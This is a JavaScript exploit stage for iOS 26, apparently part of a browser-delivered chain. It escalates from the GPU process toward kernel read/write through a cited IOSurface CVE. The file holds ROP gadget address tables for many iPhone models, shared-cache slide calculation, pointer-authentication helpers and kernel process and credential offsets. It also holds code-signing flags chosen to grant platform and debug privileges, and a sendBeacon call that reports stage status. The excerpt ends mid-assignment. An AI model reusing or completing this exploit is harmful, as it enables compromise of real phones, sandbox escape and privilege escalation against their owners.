/**
 * sbx1_main_26.js — iOS 26 GPU Process → Kernel R/W
 *
 *
 *
 */

async function sbx1_main() {
  'use strict';

  globalThis.sbx1_26_begin = Date.now();
  const peCode = 'pe_main_26.js';
  let wc_fcall = fcall;
  let wc_uread64 = read64;
  let uread64 = gpuRead64;
  let uwrite64 = gpuWrite64;
  let pacia = gpuPacia;
  let pacib = gpuPacib;
  let gpu_fcall_sleep = null && gpuFcallEnableSleep;
  let gpu_fcall_wake = null && gpuFcallDisableSleep;

  function LOG(msg) {
    if (true) log('sbx1_26: ' + msg);
  }

  if (typeof gpuRead64 !== 'function' || typeof gpuWrite64 !== 'function') {
    LOG('ERROR: GPU R/W primitives not available (need sbx0_26 first)');
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx1', execStatus: 'failed', extra: { reason: 'no_gpu_rw', version: 'ios26' } });
    }
    return false;
  }

  if (typeof gpu_fcall !== 'function') {
    LOG('ERROR: gpu_fcall not available');
    return false;
  }

  LOG('Starting iOS 26 kernel R/W via IOSurface (CVE-2025-43510-26)');

  let wc_get_cstring = function (js_str) {
    let s = js_str + "\x00";
    resolve_rope(s);
    return wc_uread64(wc_uread64(addrof(s) + 0x8n) + 0x8n);
  };

  let get_cstring = function (js_str) {
    let gpu_cstr = gpuCopyBuffer(wc_get_cstring(js_str), BigInt(js_str.length) + 1n);
    return gpu_cstr;
  };

  let func_resolve = function (symbol) {
    return gpuDlsym(0xFFFFFFFFFFFFFFFEn, symbol);
  };

  let GPU_CALLOC = func_resolve("calloc");

  function gpu_new_uint64_t(val = 0n) {
    let buf = gpu_fcall(GPU_CALLOC, 1n, 0x8n);
    uwrite64(buf, val);
    return buf;
  }

  function adjust_pivot_stack() {
    return;
  }

  function get_shared_cache_slide() {
    if (globalThis['sc_slide'] != undefined) {
      return sc_slide;
    }
    let start_address = gpu_new_uint64_t();
    gpu_fcall(func_resolve("syscall"), 294n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, start_address);
    let DYLD_SHARED_CACHE_LOAD_ADDR = 0x0000000180000000n;
    let dyld_shared_cache_slide = uread64(start_address) - DYLD_SHARED_CACHE_LOAD_ADDR;
    return dyld_shared_cache_slide;
  }

  function uread8(where) {
    return uread_bitsize(where, 8n).asInt32s()[0];
  }

  function uwrite8(where, what) {
    return uwrite_bitsize(where, BigInt(what), 8n);
  }

  function cmp8_wait_for_change(where, what) {
    let target = BigInt(what);
    while (true) {
      let val = uread64(where) & 0xffn;
      if (val != target) {
        break;
      }
    }
  }

  function cmp8_wait_for_value(where, what) {
    let target = BigInt(what);
    let start_interval = Date.now();
    let diff = 0;
    while (true && diff < 2000) {
      let val = uread64(where) & 0xffn;
      if (val == target) {
        break;
      }
      const now = Date.now();
      diff = now - start_interval;
    }
    if (diff >= 2000) {
      LOG("Break on timeout");
      return false;
    }
    return true;
  }

  function xpac(ptr) {
    return ptr.noPAC();
  }

  let shared_cache_slide = get_shared_cache_slide();
  let dyld_patching_fptr_offset = 0x208n;
  let integrated = true;
  let use_js_thread = 0;

  let set_x19_gadget = 0n;
  let set_x30_gadget = 0n;
  let load_x0_0x0_gadget = 0n;
  let load_x0_0x0_gadget_data = 0n;
  let new_save_x0_gadget = 0n;
  let new_save_x0_gadget_data = 0n;
  let isNAN_lr_gadget = 0n;
  let mov_x8_x0_gadget = 0n;
  let leak_surface_address_gadget = 0n;
  let mov_x0_x8_gadget = 0n;
  let save_sp_gadget = 0n;
  let save_x0_gadget = 0n;
  let save_x0_gadget_data = 0n;
  let mov_x20_x19_gadget = 0n;
  let restore_sp_gadget = 0n;
  let xpac_gadget = 0n;
  let restore_sp_gadget_data = 0n;
  let load_x1_0x30_gadget = 0n;
  let load_x1_0x30_gadget_data = 0n;
  let load_x0_0x18_gadget = 0n;
  let load_x0_0x18_gadget_data = 0n;
  let dyld_objc_patching_gadget = 0n;
  let dyld_signPointer_gadget = 0n;
  let dyld_patching_noprolog_gadget = 0n;
  let malloc_restore_2_gadget = 0n;
  let set_sp_gadget = 0n;
  let read_surface_address_gadget = 0n;
  let malloc_restore_0_gadget = 0n;
  let malloc_restore_1_gadget = 0n;
  let malloc_restore_3_gadget = 0n;
  let dyld_patching_dispatcher_gadget = 0n;
  let braaz_x8_gadget = 0n;
  let transformSurface_gadget = 0n;
  let tcall_CRLG = 0n;
  let tcall_X0LG = 0n;
  let tcall_RLG = 0n;
  let tcall_CSSG = 0n;
  let tcall_DSSG = 0n;
  let tcall_DG = 0n;
  let _CFObjectCopyProperty = 0n;
  let load_x1x3x8 = 0n;
  let fcall_14_args_write_x8 = 0n;
  let _4_fcalls = 0n;
  let self_loop = 0n;
  let jsvm_isNAN_fcall_gadget = 0n;
  let jsvm_isNAN_fcall_gadget2 = 0n;
  let store_x0_x0 = 0n;
  let mov_x0_x22 = 0n;
  let add_x22_0x90 = 0n;
  let str_x1_x2 = 0n;

  let pplv2_bypass_gadget = 0xfffffe00090b9740n;
  let ktrr_unlock_gadget = 0xfffffe0008928ebcn;
  let amcc_config_gadget = 0xfffffe00082e0ad4n;
  let gxf_restore_gadget = 0xfffffe00082e0ad4n;
  let pmap_enter_gadget = 0xfffffe00082de054n;
  let pmap_remove_gadget = 0xfffffe00085ca950n;
  let vm_protect_gadget = 0xfffffe00082ddf28n;
  let kernel_trap_gadget = 0xfffffe0008691af8n;
  let amfi_override_gadget = 0xfffffe000892b044n;
  let csflags_patch_gadget = 0xfffffe000892b044n;
  let platformize_gadget = 0xfffffe000892b044n;

  const PPLV2_MAGIC = 0x50504C5632n;
  const KTRR_REGION_BASE = 0xFFFFFFF008000000n;
  const KTRR_REGION_SIZE = 0x400000n;
  const AMCC_CTRL_REG = 0x2000n;
  const AMCC_LOCK_REG = 0x2008n;
  const PPLV2_STATE_BASE = 0xFFFFFFF009000000n;
  const PPLV2_LOCK_OFFSET = 0x100n;
  const PPLV2_CTX_OFFSET = 0x200n;

  const KERN_SUCCESS = 0n;
  const MACH_PORT_NULL = 0n;
  const VM_FLAGS_ANYWHERE = 0x0001n;
  const VM_FLAGS_FIXED = 0x0000n;
  const VM_FLAGS_OVERWRITE = 0x4000n;
  const VM_PROT_DEFAULT = 0x3n;
  const VM_INHERIT_NONE = 0n;
  const MAP_MEM_VM_SHARE = 0x00000008n;
  const PAGE_SIZE = 0x4000n;
  const PAGE_MASK = ~(PAGE_SIZE - 1n);

  const KERNEL_BASE_UNSLID = 0xfffffff007004000n;
  const KERNEL_SLIDE_MASK = 0xFFFFFFFFF0000000n;

  const PROC_PID_OFFSET = 0x60n;
  const PROC_PROC_RO_OFFSET = 0x18n;
  const PROC_RO_TASK_OFFSET = 0x10n;
  const PROC_UCRED_OFFSET = 0x08n;
  const PROC_FD_OFFSET = 0xe0n;
  const PROC_FLAGS_OFFSET = 0x454n;
  const PROC_LFLAG_OFFSET = 0x458n;
  const PROC_NAME_OFFSET = 0x56cn;
  const PROC_CSFLAGS_OFFSET = 0x24;
  const CS_VALID = 0x00000001n;
  const CS_GET_TASK_ALLOW = 0x00000004n;
  const CS_PLATFORM_BINARY = 0x04000000n;
  const CS_INSTALLER = 0x00000008n;
  const CS_DEBUGGED = 0x10000000n;
  const CS_DESIRED_FLAGS = CS_VALID | CS_GET_TASK_ALLOW | CS_PLATFORM_BINARY | CS_INSTALLER | CS_DEBUGGED;

  const CRED_UID_OFFSET = 0x18n;
  const CRED_GID_OFFSET = 0x28n;
  const CRED_RUID_OFFSET = 0x1Cn;
  const CRED_RGID_OFFSET = 0x68n;
  const CRED_SVUID_OFFSET = 0x20n;
  const CRED_SVGID_OFFSET = 0x6Cn;
  const CRED_GROUPS_OFFSET = 0x28n;
  const CRED_LABEL_OFFSET = 0x78n;
  const SANDBOX_SLOT_OFFSET = 0x10n;

  const CRED_AMFI_SLOT = 0x08n;

  const TASK_FLAGS_OFFSET = 0x3E0n;
  const TASK_VM_MAP_OFFSET = 0x28n;
  const TASK_ITK_SPACE_OFFSET = 0xC0n;
  const TASK_BSD_INFO_OFFSET = 0x3c0n;

  const TF_PLATFORM = 0x00000400n;
  const TF_SAMEDISK = 0x00004000n;
  const TF_TCC_ALLOW_ALL = 0x80000000n;
  const TF_PLATFORM_BINARY = TF_PLATFORM | TF_SAMEDISK;
  const TF_CS_KILLED = 0x02000000n;
  const TF_DEBUGGED = 0x00000080n;

  let kernelSlide = 0n;
  let kernelBase = 0n;
  let kernel_proc = 0n;
  let current_proc = 0n;
  let current_task = 0n;
  let current_pid = 0;

  let surface_address = 0n;
  let surface_address_remote = 0n;
  let surface_size = 0x100000n;

  const SBX1SBX1_EXP_SIZE = 8n * PAGE_SIZE;
  const MAX_TRANSFER_BYTES = 1024n * 1024n;

  let is_a12_devices = false;
  let is_a17_devices = false;
  let is_m3_devices = false;

  let remaker_connection = 0n;
  let remaker_reply_port = 0n;

  if (integrated) {
    sbx1_offsets = {
      "iPhone13,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget : 0x180148774n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x2625fc98cn,
        fcall_14_args_write_x8: 0x24ce88f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n
      },
      "iPhone14,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget : 0x180148774n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x2625fc98cn,
        fcall_14_args_write_x8: 0x24ce88f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n
      },
      "iPhone15,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget : 0x180148774n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x2625fc98cn,
        fcall_14_args_write_x8: 0x24ce88f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n
      },
      "iPhone16,1_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x2625fc98cn,
        fcall_14_args_write_x8: 0x24ce88f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone16,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x2625fc98cn,
        fcall_14_args_write_x8: 0x24ce88f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone17,1_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x261ee098cn,
        fcall_14_args_write_x8: 0x24c76cf7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone17,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x261ee098cn,
        fcall_14_args_write_x8: 0x24c76cf7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone17,3_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x261b3198cn,
        fcall_14_args_write_x8: 0x24c768f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aafd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone17,4_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x261b3198cn,
        fcall_14_args_write_x8: 0x24c768f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aafd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone17,5_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x261a9d98cn,
        fcall_14_args_write_x8: 0x24c764f7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7aefd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n,
      },
      "iPhone18,1_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x26260098cn,
        fcall_14_args_write_x8: 0x24ce8cf7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7b2fd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n
      },
      "iPhone18,2_26.0_26A321": {
        malloc_restore_2_gadget: 0x1a95f96c8n,
        dyld_signPointer_gadget: 0x1a96401e0n,
        malloc_restore_0_gadget: 0x18fc3328cn,
        malloc_restore_1_gadget: 0x1ca6e55c8n,
        malloc_restore_3_gadget: 0x1901c1d34n,
        self_loop: 0x18ff74d38n,
        tcall_CRLG: 0x1ad450d88n,
        tcall_X0LG: 0x1ad44e584n,
        tcall_RLG: 0x1ad44d0acn,
        tcall_CSSG: 0x1ad44cbc4n,
        tcall_DSSG: 0x1ad44e584n,
        tcall_DG: 0x1ad451448n,
        _CFObjectCopyProperty: 0x18e432700n,
        load_x1x3x8: 0x26260098cn,
        fcall_14_args_write_x8: 0x24ce8cf7cn,
        _4_fcalls: 0x1c62b5bf8n,
        jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
        jsvm_isNAN_fcall_gadget2 : 0x19e8c995cn,
        store_x0_x0: 0x1941d49b8n,
        mov_x0_x22: 0x193fd78d4n,
        str_x1_x2: 0x1e6962b00n,
        add_x22_0x90: 0x23a7b2fd4n,
        transformSurface_gadget: 0x20ff18970n,
        xpac_gadget: 0x1b6420a08n,
        pplv2_bypass_gadget: 0n,
        ktrr_unlock_gadget: 0n,
        amcc_config_gadget: 0n,
        gxf_restore_gadget: 0n,
        pmap_enter_gadget: 0n,
        pmap_remove_gadget: 0n,
        vm_protect_gadget: 0n,
        kernel_trap_gadget: 0n,
        amfi_override_gadget: 0n,
        csflags_patch_gadget: 0n,
        platformize_gadget: 0n
      }
    };

    let device_key = get_device_offset_key();
    LOG(`Device offset key: ${device_key}`);
    if (sbx1_offsets[device_key]) {
      let offsets = sbx1_offsets[device_key];
      malloc_restore_0_gadget = offsets.malloc_restore_0_gadget + shared_cache_slide;
      malloc_restore_1_gadget = offsets.malloc_restore_1_gadget + shared_cache_slide;
      malloc_restore_2_gadget = offsets.malloc_restore_2_gadget + shared_cache_slide;
      malloc_restore_3_gadget = offsets.malloc_restore_3_gadget + shared_cache_slide;
      dyld_signPointer_gadget = offsets.dyld_signPointer_gadget + shared_cache_slide;
      self_loop = offsets.self_loop + shared_cache_slide;
      tcall_CRLG = offsets.tcall_CRLG + shared_cache_slide;
      tcall_X0LG = offsets.tcall_X0LG + shared_cache_slide;
      tcall_RLG = offsets.tcall_RLG + shared_cache_slide;
      tcall_CSSG = offsets.tcall_CSSG + shared_cache_slide;
      tcall_DSSG = offsets.tcall_DSSG + shared_cache_slide;
      tcall_DG = offsets.tcall_DG + shared_cache_slide;
      _CFObjectCopyProperty = offsets._CFObjectCopyProperty + shared_cache_slide;
      load_x1x3x8 = offsets.load_x1x3x8 + shared_cache_slide;
      fcall_14_args_write_x8 = offsets.fcall_14_args_write_x8 + shared_cache_slide;
      _4_fcalls = offsets._4_fcalls + shared_cache_slide;
      jsvm_isNAN_fcall_gadget = offsets.jsvm_isNAN_fcall_gadget + shared_cache_slide;
      jsvm_isNAN_fcall_gadget2 = offsets.jsvm_isNAN_fcall_gadget2 + shared_cache_slide;
      store_x0_x0 = offsets.store_x0_x0 + shared_cache_slide;
      mov_x0_x22 = offsets.mov_x0_x22 + shared_cache_slide;
      str_x1_x2 = offsets.str_x1_x2 + shared_cache_slide;
      add_x22_0x90 = offsets.add_x22_0x90 + shared_cache_slide;
      transformSurface_gadget = offsets.transformSurface_gadget + shared_cache_slide;
      xpac_gadget = offsets.xpac_gadget + shared_cache_slide;
      pplv2_bypass_gadget = offsets.pplv2_bypass_gadget;
      ktrr_unlock_gadget = offsets.ktrr_unlock_gadget;
      amcc_config_gadget = offsets.amcc_config_gadget;
      gxf_restore_gadget = offsets.gxf_restore_gadget;
      pmap_enter_gadget = offsets.pmap_enter_gadget;
      pmap_remove_gadget = offsets.pmap_remove_gadget;
      vm_protect_gadget = offsets.vm_protect_gadget;
      kernel_trap_gadget = offsets.kernel_trap_gadget;
